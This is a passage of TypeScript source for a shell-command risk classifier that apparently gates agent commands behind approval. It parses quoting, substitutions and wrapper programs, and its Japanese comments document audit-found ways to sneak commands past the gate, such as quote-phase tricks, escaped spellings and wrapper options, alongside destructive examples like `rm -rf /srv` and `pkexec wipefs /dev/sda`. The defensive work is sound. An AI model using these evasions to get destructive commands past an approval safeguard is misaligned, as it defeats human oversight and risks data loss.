      const elided = elideRedirect(i + redirectOperatorLength(command, i));
      if (elided < 0) return splitSegmentsUnparseable(command); // 未終端 quote → fail-safe。
      i = elided;
      continue;
    }
    if (ch === ">") {
      const elided = elideRedirect(i + redirectOperatorLength(command, i));
      if (elided < 0) return splitSegmentsUnparseable(command); // 未終端 quote → fail-safe。
      i = elided;
      continue;
    }
    current += ch;
    i += 1;
  }
  // 未消費 heredoc (delimiter の後に改行が無い) = bash は空本文を EOF で終端してコマンドを実行する
  //   (SEC-CQ11-4)。演算子と delimiter は既に除去済みなので、残った語がそのまま実コマンド。
  //   以前の「旧分割へフォールバック」は over-gate ではなく fail-open だった (上の本文ループ参照)。
  // 未終端クォートは `quoteSpanEnd` が -1 を返した時点で既に fail-safe へ倒れている
  // (状態変数を持たないので「閉じ忘れの検査を忘れる」形の穴が構造的に作れない)。
  pendingHeredocs.length = 0;
  push();
  // 除去した「実行される redirect 対象語」を末尾に足す (TDA-CQ6-1 ≡ QA-CQ6-1)。
  for (const target of elidedExecutableTargets) segments.push(target);
  return segments;
}

/**
 * `i` が引用の開始なら、その**閉じの次**の index を返す (T1 単一出所)。
 *
 * 返り値: `0` = 引用の開始でない / `-1` = 未終端 (構造解析不能) / 正数 = 閉じの次。
 * 対応する形と escape 規則は bash に合わせる:
 *  - `'…'`   単一引用。backslash は**字義**(escape しない) → 最初の `'` で閉じる。
 *  - `$'…'`  ANSI-C quoting。backslash escape を**処理する** → `\\'` では閉じない。
 *  - `"…"` / `$"…"`  二重引用。backslash が次の 1 文字を字義化する。
 *
 * **SEC-CQ9-1 (R9 監査 H)**: `$'` を「通常文字の `$` + 単一引用の `'`」として流す実装は
 * `$'a\\'b'` を 1 文字早く閉じ、以降の quote 位相がすべて反転する。位相が反転すると
 * `;` や `>` や `<(` が引用の内外を取り違え、`cat $'a\\'b' x; > /tmp/o rm -rf /srv` の rm が
 * 丸ごと分類から消えた (実 bash は実行する — 監査レーンが stub-argv オラクルで確認)。
 * 引用の読み方を**複数箇所で手書きしない**ための単一出所 (security-gate-reuse-canonical-parser)。
 *
 * **`$$'…'` は ANSI-C ではない (R10 M・R9 起因)**: bash は `$$` を PID パラメータとして先に消費する
 * ので、`$$'a\'` は「PID + 通常の単一引用 `'a\'`」= backslash は字義で 2 つ目の `'` で閉じる。
 * `$'` だけを見ると ANSI-C と誤読して `\'` を escape 扱いし、閉じを取りこぼして位相がずれる
 * (実 bash: `echo $$'a\'; touch M; echo 'x'` は M を作る = 後続コマンドが実行される)。
 * 規則は「`i` で終わる **escape されていない `$` の連なり**が偶数長なら、この `$` は `$$` の
 * 片割れで引用の開始ではない」。`$$$'…'` (奇数) は `$$` + `$'…'` で ANSI-C、`\$$'…'` は
 * `\$` + `$'…'` で ANSI-C、`\\$$'…'` は `\\` + `$$` + `'…'` で通常引用 (すべて実 bash で確認)。
 * 連なりの走査はこの `$` が引用文字に隣接するときだけ起きる (先行する `$` は `open` 判定で即 return)
 * ので線形性は保たれる。
 */
function quoteSpanEnd(s: string, i: number): number {
  const c = s[i];
  const dollar = c === "$" && (s[i + 1] === "'" || s[i + 1] === '"');
  const open = dollar ? (s[i + 1] as string) : c;
  if (open !== "'" && open !== '"') return 0;
  if (dollar && dollarPairsIntoPid(s, i)) return 0;
  // 単一引用だけが escape を処理しない。ANSI-C (`$'…'`) と二重引用は処理する。
  const escapes = dollar || open === '"';
  for (let j = dollar ? i + 2 : i + 1; j < s.length; j += 1) {
    const ch = s[j] as string;
    if (escapes && ch === "\\") {
      j += 1;
      continue;
    }
    if (ch === open) return j + 1;
  }
  return -1;
}

/**
 * `i` の `$` が (`$$` の PID パラメータとして) 直前の `$` と対を成すか — `quoteSpanEnd` の下請け。
 * `i` で終わる `$` の連なりを数え、その手前の backslash が奇数個なら連なりの先頭は escape 済み
 * (`\$`) として除外する。偶数長 = この `$` は片割れ、奇数長 = この `$` が `$'…'` / `$"…"` を開く。
 */
function dollarPairsIntoPid(s: string, i: number): boolean {
  let run = 0;
  let k = i;
  while (k >= 0 && s[k] === "$") {
    run += 1;
    k -= 1;
  }
  let backslashes = 0;
  while (k >= 0 && s[k] === "\\") {
    backslashes += 1;
    k -= 1;
  }
  if (backslashes % 2 === 1) run -= 1;
  return run % 2 === 0;
}

/**
 * 引用スパン `[from, end)` の**中身**を、bash の展開規則で 1 度だけ剥がして返す。
 *
 * `readWord` が語のリテラルを組み立てるための下請け。スパンの境界判定は `quoteSpanEnd` が
 * 単一出所で、ここは「その中身をどう字義化するか」だけを担う。
 *  - `'…'`   何も解釈しない (backslash も字義)。
 *  - `"…"`   backslash は `$` `` ` `` `"` `\` と改行の**前でだけ** escape として働く。
 *            それ以外の前では backslash 自体が字義として残る (bash の規則)。
 *  - `$'…'`  ANSI-C。`\\` `\'` `\"` `\n` `\t` `\r` を解釈し、他は escape された 1 文字を返す。
 */
function quotedSpanLiteral(s: string, from: number, end: number): string {
  const dollar = s[from] === "$";
  const open = (dollar ? s[from + 1] : s[from]) as string;
  const body = s.slice(dollar ? from + 2 : from + 1, end - 1);
  if (open === "'" && !dollar) return body;
  let out = "";
  for (let i = 0; i < body.length; i += 1) {
    const c = body[i] as string;
    if (c !== "\\" || i + 1 >= body.length) {
      out += c;
      continue;
    }
    const next = body[i + 1] as string;
    if (dollar) {
      out += ANSI_C_ESCAPES[next] ?? next;
      i += 1;
      continue;
    }
    // 二重引用: escape が効くのは限られた文字の前だけ。
    if (next === "$" || next === "`" || next === '"' || next === "\\" || next === "\n") {
      out += next;
      i += 1;
      continue;
    }
    out += c;
  }
  return out;
}
const ANSI_C_ESCAPES: Readonly<Record<string, string>> = {
  n: "\n",
  t: "\t",
  r: "\r",
  "\\": "\\",
  "'": "'",
  '"': '"',
};

/**
 * unquoted heredoc 本文から**展開される置換** (`$(…)` / backtick) を取り出す (SEC-CQ10-2)。
 *
 * heredoc 本文の展開規則は通常の語と違う: 引用文字はデータで、backslash は `$` `` ` `` `\\`
 * の前でだけ展開を止める。それ以外の語意味論を当ててはいけない (当てたのが R10 H2)。
 * 置換の**内側**はシェルコードなので `substitutionEnd` (引用対応・入れ子対応) で読み切る。
 * 未終端の置換は `undefined` (構造解析不能 → 呼び出し側が fail-safe へ倒す)。1 回で打ち切るので
 * 二次挙動にならない。
 */
function heredocBodySubstitutions(body: string): string[] | undefined {
  const found: string[] = [];
  let i = 0;
  while (i < body.length) {
    const c = body[i];
    if (c === "\\" && i + 1 < body.length) {
      i += 2; // `\$(` `\`` は展開されない (実 bash で確認)。
      continue;
    }
    if ((c === "$" && body[i + 1] === "(") || c === "`") {
      const end = substitutionEnd(body, i);
      if (end < 0) return undefined;
      found.push(body.slice(i, end));
      i = end;
      continue;
    }
    i += 1;
  }
  return found;
}

/** `readWord` の結果。`end` は語の**次**の index、`literal` は引用/escape を剥がした語。 */
interface WordScan {
  readonly end: number;
  readonly unterminated: boolean;
  readonly literal: string;
  /**
   * 非クォートの backslash escape を消費したか (`\curl` / `r\m` の alias 迂回形)。
   *
   * 引用による綴り変更 (`r""m`) は含めない — base 実装の床と同じ範囲に保つため。
   * 引用形まで広げるのは境界ゲートの適用範囲変更なので、独立した判断として扱う。
   */
  readonly escaped: boolean;
}

/**
 * `from` からシェルの 1 語を読む — **語の読み方の単一出所** (v0.8 統合・TDA-CQ6-3)。
 *
 * シェルの 1 語は「引用断片・escape・置換が連結したもの」で、途中の空白や区切りは
 * それらの内側にある限り語を終わらせない (`>"a b"c` / `>a\ b` / `FOO='a b'` / `$(f x)`)。
 * この規則はかつて **4 箇所に手書き複製**されていた (メインループ / `targetEnd` /
 * heredoc delimiter 読み取り / `tokenize`) 。R2〜R9 の H はすべて「そのうち 1 箇所だけが
 * 1 文字ずれる」形で生まれており、複製そのものが機構的原因だった (CQ-R6 裁定 019ffe0c)。
 *
 * 返す `literal` は引用と escape を剥がした語 — `tokenize` はこれを使うので、
 * 「トークン分割」と「語の境界」が同じ規則になる (以前の `tokenize` は引用文字を空白へ
 * 置き換える近似で、`FOO='a b' rm -rf /` を 2 語に割って実プログラムを隠していた = R10 H5)。
 * 置換 (`$(…)` / backtick / `<(…)`) は**生のまま** literal に含める — 中身は語ではなくコードで、
 * 再分類は `reclassifySubstitution` 等の専用経路が生文字列に対して行うため。
 */
type BoundaryPredicate = (c: string | undefined) => boolean;

/**
 * 1 回の語走査シリーズで許す「未終端の引用/置換」検出回数の予算。
 *
 * 未終端の引用も置換も終端を探して入力末尾まで走るため、`$(`×N のような入力で語ごとに
 * 再走査すると O(N²) になる (同期 hook パス上の DoS 面・SEC-CQ8-2 が同じクラスを
 * `collectSubstitutionInners` で閉じたのと同一の理由)。1 度でも未終端を見たら入力は既に
 * 構造解析不能なので、以降は開き文字を通常文字として扱っても判定は安全側にしか動かない。
 */
interface WordScanBudget {
  failures: number;
}

function readWord(
  s: string,
  from: number,
  atBoundary: BoundaryPredicate,
  budget: WordScanBudget,
): WordScan {
  let j = from;
  let literal = "";
  let escaped = false;
  while (j < s.length) {
    const c = s[j] as string;
    if (c === "\\" && j + 1 < s.length) {
      literal += s[j + 1] as string;
      escaped = true;
      j += 2;
      continue;
    }
    if (budget.failures < MAX_SUBSTITUTION_SCAN_FAILURES) {
      const quoteEnd = quoteSpanEnd(s, j);
      if (quoteEnd === -1) {
        budget.failures += 1;
        return { end: j, unterminated: true, literal, escaped };
      }
      if (quoteEnd > 0) {
        literal += quotedSpanLiteral(s, j, quoteEnd);
        j = quoteEnd;
        continue;
      }
      const subEnd = substitutionEnd(s, j);
      if (subEnd === -1) {
        budget.failures += 1;
        return { end: j, unterminated: true, literal, escaped };
      }
      if (subEnd > 0) {
        literal += s.slice(j, subEnd);
        j = subEnd;
        continue;
      }
    }
    if (atBoundary(c)) break;
    literal += c;
    j += 1;
  }
  return { end: j, unterminated: false, literal, escaped };
}

/**
 * `i` の `#` がシェルのコメント開始か — 語頭 (先頭 or **escape されていない**空白/区切りの直後) のみ。
 *
 * `splitSegments` と置換収集器の**単一出所** (SEC-R6-1 の escape 規則を含む)。片方だけが
 * コメントを尊重すると、コメント本文が「コード」として走査され偽陽性を生む (TDA-CQ9-2)。
 */
function startsComment(s: string, i: number, escapePairEnd: number): boolean {
  if (s[i] !== "#" || escapePairEnd === i) return false;
  const previous = s[i - 1];
  return previous === undefined || isWordBoundaryChar(previous);
}

/**
 * `i` が「中身が実行される置換」の開始なら、その**閉じの次**の index を返す (T1 単一出所)。
 *
 * 返り値: `0` = 置換の開始でない / `-1` = 開始だが未終端 (構造解析不能) / 正数 = 閉じの次。
 *
 * 対応する形は `$( … )` / `` ` … ` `` / `<( … )` / `>( … )`。**入れ子を括弧の深さで数える**
 * (QA-CQ6-3・R6 監査 H): 従来の `indexOf(")")` は最初の閉じ括弧で切れるため
 * `cat <(cat <(find /tmp -delete))` の内側を取りこぼし category を落としていた。
 * 単一クォート内の括弧はデータなので数えない (`$(echo "a)b")` で早期終了しない)。
 *
 * 走査は `SUBSTITUTION_SCAN_LIMIT` 文字で打ち切る (同期 hook パスの有界性・SEC-CQ5-3 と同方針)。
 */
function substitutionEnd(command: string, i: number): number {
  const c = command[i];
  if (c === "`") {
    for (let j = i + 1; j < command.length && j - i <= SUBSTITUTION_SCAN_LIMIT; j += 1) {
      const ch = command[j] as string;
      if (ch === "\\") {
        j += 1;
        continue;
      }
      if (ch === "`") return j + 1;
    }
    return -1;
  }
  const opensParen =
    (c === "$" || c === "<" || c === ">") && command[i + 1] === "(" ? command[i + 1] : undefined;
  if (opensParen === undefined) return 0;
  let depth = 0;
  let quote: '"' | "'" | undefined;
  for (let j = i + 1; j < command.length && j - i <= SUBSTITUTION_SCAN_LIMIT; j += 1) {
    const ch = command[j] as string;
    if (quote === "'") {
      if (ch === "'") quote = undefined;
      continue;
    }
    if (quote === '"') {
      if (ch === "\\") {
        j += 1;
        continue;
      }
      if (ch === '"') quote = undefined;
      continue;
    }
    if (ch === "\\") {
      j += 1;
      continue;
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      continue;
    }
    if (ch === "(") depth += 1;
    else if (ch === ")") {
      depth -= 1;
      if (depth === 0) return j + 1;
    }
  }
  return -1;
}

/**
 * 抽出に失敗 (未終端) してよい回数の上限。
 *
 * SEC-CQ8-2 (R8 監査): 未終端の置換は `substitutionEnd` が走査上限まで走るため、
 * `echo '` + `$(`×N のような入力が O(N²) になっていた (同期 hook パス上の DoS 面・
 * 実測 4 倍入力で 15.9 倍)。**1 回でも失敗すれば `aborted` 床 (medium + high-risk-other) は
 * 既に立っている**ので、以降の兄弟を諦めても判定は安全側にしか動かない。
 */
const MAX_SUBSTITUTION_SCAN_FAILURES = 8;

/**
 * 「中身が実行される置換」の**中身**を引用状態つきで集める正準収集器 (T1 単一出所)。
 *
 * **なぜ引用を見るのか (SEC-CQ8-3・R8 監査)**: 検出点が引用を見ないと
 * `grep -rn '<(' .` のような**引用内のリテラル**まで「未終端の置換」と誤認し、
 * R7 で入れた `aborted` 床が medium[high-risk-other] を付けて**偽の承認カード**を出す
 * (本ブランチが潰そうとしている症状そのもの)。bash の意味論に合わせて
 * - process substitution `<(` / `>(` … 単一/二重どちらの引用内でも起きない
 * - command substitution `$(` / backtick … 単一引用内では起きない (二重引用内では起きる)
 * とし、**引用が閉じないまま終わったら `aborted`** に倒す (構造解析不能 = fail-safe)。
 *
 * 3 つあった並置スキャナ (process / command / backtick の naive split) をここへ畳む
 * (`security-gate-reuse-canonical-parser`・第二の検出器を作らない)。
 */
function collectSubstitutionInners(
  s: string,
  kind: "process" | "command",
): { inners: string[]; starts: number[]; aborted: boolean; capExhausted: boolean } {
  const inners: string[] = [];
  /** 各置換の開始 index。起動判定を「その置換を含む単純コマンド」へ束縛するのに使う。 */
  const starts: number[] = [];
  let aborted = false;
  let capExhausted = false;
  let failures = 0;
  // 二重引用の内側か。**command 置換のみ**が二重引用内で展開されるので、process 置換を
  //   探すときは二重引用スパンごと読み飛ばし、command を探すときだけ内側へ入る。
  let inDouble = false;
  let escapePairEnd = -1;
  let i = 0;
  while (i < s.length) {
    const c = s[i] as string;
    if (c === "\\" && i + 1 < s.length) {
      i += 2;
      escapePairEnd = i;
      continue;
    }
    if (inDouble) {
      if (c === '"') {
        inDouble = false;
        i += 1;
        continue;
      }
    } else {
      // **コメント本文はコードではない (TDA-CQ9-2・R9 監査)**: 収集器は生コマンドを受け取るが
      //   コメント除去は `splitSegments` 側にしかなかったため、`cat <(echo ok) # don't` の
      //   アポストロフィが未終端引用と見なされ `aborted` 床 = 偽の承認カードを出していた。
      //   これは本ブランチが除去しようとしている偽陽性クラスそのもの。語頭判定は単一出所。
      if (startsComment(s, i, escapePairEnd)) {
        const nl = s.indexOf("\n", i);
        if (nl === -1) break;
        i = nl + 1;
        continue;
      }
      // 展開が起きない引用スパン (`'…'` / `$'…'`・process を探すときは `"…"` / `$"…"` も) は
      //   丸ごと読み飛ばす = 中身はデータ。
      const literalHere =
        kind === "process" || c === "'" || (c === "$" && s[i + 1] === "'") ? quoteSpanEnd(s, i) : 0;
      if (literalHere === -1) {
        aborted = true;
        break;
      }
      if (literalHere > 0) {
        i = literalHere;
        continue;
      }
      if (c === '"' || (c === "$" && s[i + 1] === '"')) {
        inDouble = true;
        i += c === "$" ? 2 : 1;
        continue;
      }
    }
    const opensHere =
      kind === "process"
        ? (c === "<" || c === ">") && s[i + 1] === "("
        : (c === "$" && s[i + 1] === "(") || c === "`";
    if (opensHere) {
      const end = substitutionEnd(s, i);
      if (end < 0) {
        // **打ち切りは兄弟を巻き込まない (SEC-R7-1)**: 旧実装は `break` で以降の置換を
        //   すべて捨てたため、無害だが巨大な `<(echo …)` を 1 つ前置するだけで後続の
        //   `<(chown -R …)` が分類から消えた。1 つ進めて走査を続け、「解析できなかった」
        //   ことは aborted で呼び出し側へ伝える。ただし失敗の反復は二次挙動になるため
        //   上限で打ち切る (SEC-CQ8-2・床は既に立っているので安全側)。
        aborted = true;
        failures += 1;
        if (failures >= MAX_SUBSTITUTION_SCAN_FAILURES) {
          capExhausted = true;
          break;
        }
        i += c === "`" ? 1 : 2;
        continue;
      }
      // backtick は 1 文字開き、`$(`/`<(`/`>(` は 2 文字開き。閉じは 1 文字。
      inners.push(s.slice(i + (c === "`" ? 1 : 2), end - 1));
      starts.push(i);
      i = end;
      continue;
    }
    i += 1;
  }
  // 閉じられていない引用はコマンドとして構造解析できない → 「読めなかった」と同義に倒す。
  if (inDouble) aborted = true;
  return { inners, starts, aborted, capExhausted };
}

/**
 * 「中身が実行される置換」を含むか — process substitution と command substitution の **単一 predicate**。
 *
 * TDA-CQ6-1 の勧告どおり、両者を別々に判定する**第二の並置検出器を作らない**
 * (`security-gate-reuse-canonical-parser`)。R6 の unblock が `<(`/`>(` だけを見たために
 * 兄弟のコマンド置換が丸ごと開いたままになった、という失敗を構造的に繰り返さないための出所。
 */
function hasExecutableSubstitution(s: string): boolean {
  return hasProcessSubstitution(s) || hasCommandSubstitution(s);
}

/**
 * セグメントを空白でトークン化する。
 *
 * 再監査#4 round2 (G): 旧実装 `.replace(/["'`]/g, " ")` は全クォートを**空白置換**するため、
 * 実シェルでは連結される単語内クォート (`r""m` / `'r'm` → `rm`) を `r m` に誤分割し、
 * commandName が "r" になって rm 検出を取りこぼしていた (承認ゲート素通り)。
 *
 * 修正: クォート (`"` `'` backtick) を **単語境界か単語内か**で振り分ける:
 *  - 単語境界 (前後いずれかが空白 or 文字列端) → 空白化 (従来通りトークン区切り)。
 *    例 `sh -c "rm -rf /"` の ` "` は前が空白 → 空白化し `-c` 検出と内側分解を維持。
 *  - 単語内 (前後とも非空白) → 空文字化 (連結を正しく再現)。
 *    例 `r""m` → `rm` / `echo "a"b"c"` → `echo abc`。
 *
 * 純粋な文字走査 (正規表現の置換ループ無し・O(n) 線形) で実装し ReDoS 経路を増やさない。
 */
export function tokenize(segment: string): string[] {
  const out: string[] = [];
  for (const word of segmentWords(segment)) if (word.literal.length > 0) out.push(word.literal);
  return out;
}

/**
 * セグメントの語を順に読む唯一のイテレータ (`tokenize` と `hasEscapedProgramWord` が共有)。
 * 未終端の引用/置換は語をそこで打ち切り、開き文字を**区切りとして読み飛ばして**残りを別語として
 * 露出させる (fail-safe / over-gate 方向)。末尾まで黙って飲み込むと `a;\'rm -rf /path` の
 * 実プログラムが分類から消える — splitSegments は未終端引用を legacy 分割へ倒すので、その断片は
 * 必ずここへ来る。`end` は必ず進む (境界文字でしか止まらず、境界はループ先頭で消費される)。
 */
function* segmentWords(segment: string): Generator<WordScan> {
  const budget: WordScanBudget = { failures: 0 };
  let i = 0;
  while (i < segment.length) {
    if (isWhitespaceBoundaryChar(segment[i])) {
      i += 1;
      continue;
    }
    const word = readWord(segment, i, isWhitespaceBoundaryChar, budget);
    yield word;
    i = word.unterminated ? word.end + 1 : word.end > i ? word.end : i + 1;
  }
}

/**
 * セグメント先頭の実行語が非クォート backslash で綴りを変えた形か (`\curl` / `r\m`)。
 *
 * `\curl https://x` は shell の alias/function を意図的に迂回する実行形で、分類器は base から
 * **medium 床**を保っている (`persistable=false` を弱めない)。この床はかつて「旧 `tokenize` が
 * backslash を落とさないので先頭トークンが `isCleanExecutableToken` を通らない」という
 * **副作用**で立っていた。語を正しく読むと綴りが `curl` に畳まれて床が黙って外れるため、
 * 判定を明示述語として独立させる (`readWord` の単一出所をそのまま共有し、第二の走査器を作らない)。
 */
export function hasEscapedProgramWord(segment: string): boolean {
  // 先頭の env 代入 (`FOO=bar`) は実行語ではないので読み飛ばす (分類路と同じ規則)。
  for (const word of segmentWords(segment))
    if (!ASSIGNMENT_TOKEN_RE.test(word.literal)) return word.escaped;
  return false;
}

/**
 * トークン先頭をコマンド名 (shell escape 除去, basename, 小文字化) に正規化する。
 *
 * QA-3: `tokens[0] !== "rm"` のような **大小文字を区別する素の比較**は uppercase 変種
 * (`RM -RF /tmp`) を取りこぼし、承認ゲートを素通りさせていた。コマンド名比較は常に本関数で
 * 小文字化した basename に対して行う (`/usr/bin/RM` → `rm`)。さらに POSIX shell が実行前に
 * 除去する backslash escape を 1 文字ずつ畳む (`r\m` / `\/bin\/r\m` → `rm`)。これを行わないと
 * shell では `rm` として実行される綴りが分類器だけ別名になり、承認ゲートを素通りする。
 * 引数・パスは大小文字を保つため、ここでは tokens[0] のみを対象にする。
 */
export function commandName(tokens: string[]): string {
  const first = tokens[0];
  if (typeof first !== "string" || first.length === 0) return "";
  // **backslash escape はここで畳まない (v0.8 統合)**: 語の読み取り (`readWord`) が既に
  //   shell の escape/quote 規則を適用してトークンを作っている。ここで二度目を畳むと
  //   `a\\a` (bash では `a\a` という名前) が `aa` になり、判定不能であるべき綴りが
  //   「きれいな名前」に見えて medium 床が黙って外れる。escape の解釈は 1 箇所だけ
  //   (security-gate-reuse-canonical-parser)。
  const shellName = first;
  const base = shellName.includes("/") ? (shellName.split("/").pop() ?? shellName) : shellName;
  return base.toLowerCase();
}

/**
 * xargs の**値を必ず取る**オプション (分離形のみ)。任意引数の `-i` / `--replace` / `--max-lines`
 * は入れない — 値が無いとき実コマンドを 1 つ食ってゲートを弱める方向に倒れる。
 */
const XARGS_VALUE_OPTIONS: ReadonlySet<string> = new Set(
  "-I -d -E -L -n -P -s -a --delimiter --max-args --max-procs --max-chars --arg-file".split(" "),
);

/**
 * 既知の command-runner ラッパ (再#3 QA-1 / QA-3)。
 *
 * これらは「後続の引数列を別コマンドとして実行する」プログラム。tokens[0] の basename だけで
 * 対象を同定すると、`env rm -rf /` / `timeout 5 rm -rf /tmp` / `sudo rm -rf /` のように配下の
 * 破壊コマンドを取りこぼし low/medium に落ち、承認ゲートを素通りさせていた。分類前にラッパを
 * **再帰的に剥がして**実コマンドを同定する。
 *
 * 各ラッパが「実コマンドの前に取りうる自分用の引数」をスキップするためのルールを持つ:
 *  - env: `-i` / `-u NAME` / `VAR=val` (代入) / `-` を実コマンド前に取る。
 *  - timeout: option (`-s X`/`--signal=...`/`-k`/`--preserve-status` 等) + duration を取る。
 *  - sudo: `-u user` / `-g group` / `-i` / `-E` / `-H` 等を取る。
 *  - nice: `-n N` / `-N` を取る。
 *  - その他 (xargs/nohup/command/stdbuf/setsid) は短/長オプションのみを汎用スキップ。
 *
 * ⚠️ sh/bash 等のシェルは RUNNER_WRAPPERS に**含めない**。シェルの扱いは 2 通りに分岐する:
 *    - `sh script.sh` のようなファイル実行は通常コマンド (low のまま、over-gate しない)。
 *    - `sh -c "..."` のようなインラインコードは classifyInlineCode が別途検出してゲートする
 *      (SEC-1。stripRunnerWrappers の責務外 = 実コマンド同定ではなく「内側コードの再分類/床上げ」)。
 */
const RUNNER_WRAPPERS = new Set([
  "env",
  "xargs",
  "timeout",
  "nohup",
  "nice",
  "command",
  "stdbuf",
  "setsid",
  "sudo",
  "doas",
  // SEC-12 (round D 再監査): 権限昇格ラッパは配下を別コマンドとして実行する。pkexec/run0 を剥がさないと
  //   `pkexec wipefs /dev/sda` が commandName=pkexec で破壊ツールを取りこぼし floor で medium 止まり
  //   (本来 high)。sudo/doas と対称化する。
  "pkexec",
  "run0",
  // 再監査#4 round2 (E): 後続を実コマンドとして実行/評価する prefix ビルトイン。
  //   `exec sh -c "..."` / `time rm -rf /` / `builtin rm -rf /` の prefix で実コマンドが隠れる穴を、
  //   既存のラッパ剥がし機構で一括除去する (剥がし後の実コマンドを構造判定の対象にする)。
  //   `.` / `source` は「ファイル/プロセス置換を source 実行する」別挙動のため (F) で扱う。
  "exec",
  "time",
  "builtin",
  // Multi-call binaries: the first positional argument selects and executes an applet. Without
  // stripping this layer, `busybox rm -rf /` and `toybox rm -rf /` looked like benign commands.
  "busybox",
  "toybox",
  // R17 M (TDA-CQ17-1 ≡ SEC-CQ17-3・base main 2a9042a から存在): 実 bash marker GT で配下を実行することを
  //   確認したラッパ (inv-approval R17 が bash 由来で固定)。`ionice -c3 rm -rf …` / `chroot /srv …` /
  //   `unshare -r …` / `taskset 1 …` / `flock /tmp/l …` / `watch …` が commandName=ラッパで low/[] に落ち、
  //   `!== "low"` の承認カードが出なかった。`flock FILE -c '…'` / `script -c '…'` の文字列形は
  //   `stripRunnerWrappers` が `sh -c …` へ書き換えて既存の inline-shell 経路に流す (第二パーサを作らない)。
  //   `script` (既定で子の exit を返さない) と `watch` (終了しない) は exit を隠すので check 側は
  //   `EXIT_MASKING_WRAPPERS` で credit を拒否する。
  "ionice",
  "chroot",
  "unshare",
  "taskset",
  "flock",
  "watch",
  "script",
  // R18 (TDA-CQ18-3): `su [-] [user] -c 'cmd'` / `--session-command`。PERSIST_DENY には以前から在った。
  "su",
]);

/**
 * 配下の exit code を**自分の exit として返さない**ラッパ (R17・実 bash GT): `script -qc 'exit 3' log` は
 * `-e` 無しで rc=0、`watch` は割り込まれるまで終わらず rc は watch 自身のもの。risk 側は配下を見るために
 * 剥がすが、check 側 (ADR 0015「exit がそのチェックの結果か」) は前置に含まれていれば credit しない。
 * `setsid` は `-f`/`--fork` で fork して即 rc=0 を返し (R18 M・SEC-CQ18-2: `setsid -f sh -c 'exit 3'` rc=0)、
 * `-f` 無しでも process-group leader なら fork する — 形で分けず常時 refuse (under-credit 側・開示)。
 * `⊆ RUNNER_WRAPPERS` を inv-approval R17 が pin する (剥がされないラッパはここにあっても check 側に届かない)。
 */
export const EXIT_MASKING_WRAPPERS: ReadonlySet<string> = new Set(["script", "watch", "setsid"]);

/**
 * ラッパ別の option 文法 (R18 H・SEC-CQ18-1 ≡ TDA-CQ18-1/-3): **理解できる option だけ剥がす**。
 *
 * GNU getopt_long は値つき long option を `--opt VALUE` (分離) でも `--opt=VALUE` (融合) でも受ける。表に
 * 無い分離 long option を 1 語として飛ばすと値が実コマンドに見え、`env --unset FOO rm -rf …` /
 * `nice --adjustment 5 rm -rf …` / `timeout --signal KILL 5 rm -rf …` / `chroot --userspec u:g /srv rm -rf …` が
 * low/[] に落ちた (base main 2a9042a は `!` / `2>&1` / `(` 前置が旧 tokenizer の**偶然の**解析不能床で
 * medium だったため、正しく読める本ブランチで穴が露出した・427 実ベクタ)。R17 までは wrapper ごとの
 * if 連鎖 + 表 2 枚に散っていた規則を 1 表へ畳む (TDA-CQ18-3)。
 *
 *  - `valued`: 値を別トークンで取る option (short / long)。`i += 2`。
 *  - `flags`: 値を取らない**既知の** long option。`=` 融合 long は文法によらず 1 語で完結。
 *  - **表に無い分離 long option は解析不能** (`unknownOption`): 剥がすのを止めて返し、分類本体が
 *    `capExhausted` と同じ medium + high-risk-other の床を立てる (base の偶然の床を意図した床として復元)。
 *    短 option は既知の値つき以外は 1 語として飛ばす (従来どおり・残余として開示: `-x VALUE` 形の未知
 *    短 option は同クラスの穴だが、GNU の短 option は値を融合するのが通例で分離 long ほど広くない)。
 *  - `positional`: 実コマンドの前に置かれる位置引数の数 (timeout の duration / chroot の newroot /
 *    taskset の mask / flock の lockfile / script の typescript / su の user)。`--` は option 終端で
 *    **位置引数の消費は続ける** (`flock -- /tmp/l cmd` — TDA-CQ18-1)。位置引数の後も option を読む
 *    (getopt は並べ替える: `flock FILE -c 'cmd'` / `script LOG -c 'cmd'`)。
 *  - `shellString`: `-c CMD` / `-qc CMD` / `--command CMD` / `--command=CMD` (`su` は `--session-command`
 *    も) で残りを `sh -c …` に書き換え既存の inline-shell 経路へ流す (SEC-CQ18-3・第二パーサを作らない)。
 *  - `restIsShellString`: option 以外の残り全部を `sh -c` で実行する (`watch 'rm -rf x'`・TDA-CQ18-1)。
 * 各形は inv-approval R17/R18 の bash 由来 metatest が「本当に実行する」ことを marker で検定する。
 */
interface WrapperGrammar {
  readonly valued: ReadonlySet<string>;
  readonly flags: ReadonlySet<string>;
  readonly positional: number;
  readonly shellString: boolean;
  readonly restIsShellString: boolean;
}
const words = (s: string): ReadonlySet<string> => new Set(s.split(" "));
const EMPTY_WORDS: ReadonlySet<string> = new Set();
const grammar = (g: Partial<WrapperGrammar>): WrapperGrammar => ({
  valued: EMPTY_WORDS,
  flags: EMPTY_WORDS,
  positional: 0,
  shellString: false,
  restIsShellString: false,
  ...g,
});
const WRAPPER_GRAMMAR: ReadonlyMap<string, WrapperGrammar> = new Map([
  [
    "env",
    grammar({
      valued: words("-u --unset -C --chdir -S --split-string"),
      flags: words(
        "-i --ignore-environment -0 --null -v --debug --block-signal --default-signal --ignore-signal --list-signal-handling",
      ),
    }),
  ],
  [
    "xargs",
    grammar({
      valued: new Set([...XARGS_VALUE_OPTIONS, "--process-slot-var"]),
      flags: words(
        "-0 --null -r --no-run-if-empty -t --verbose -p --interactive -x --exit -o --open-tty --show-limits -i --replace -e --eof",
      ),
    }),
  ],
  [
    "timeout",
    grammar({
      valued: words("-s --signal -k --kill-after"),
      flags: words("--preserve-status --foreground -v --verbose"),
      positional: 1,
    }),
  ],
  ["nice", grammar({ valued: words("-n --adjustment") })],
  [
    "sudo",
    grammar({
      valued: words(
        "-u --user -g --group -U --other-user -p --prompt -C --close-from -h --host -r --role -t --type -D --chdir -R --chroot -T --command-timeout",
      ),
      flags: words(
        "-E --preserve-env -n --non-interactive -S --stdin -k --reset-timestamp -K --remove-timestamp -i --login -s --shell -H --set-home -b --background -A --askpass -B --bell -P --preserve-groups",
      ),
    }),
  ],
  ["doas", grammar({ valued: words("-u -C -a") })],
  [
    "pkexec",
    grammar({ valued: words("-u --user"), flags: words("--disable-internal-agent --keep-cwd") }),
  ],
  ["run0", grammar({ valued: words("-u --user") })],
  ["exec", grammar({ valued: words("-a") })],
  ["stdbuf", grammar({ valued: words("-i -o -e --input --output --error") })],
  ["setsid", grammar({ flags: words("-c --ctty -f --fork -w --wait") })],
  [
    "ionice",
    grammar({
      valued: words("-c --class -n --classdata -p --pid -P --pgid -u --uid"),
      flags: words("-t --ignore"),
    }),
  ],
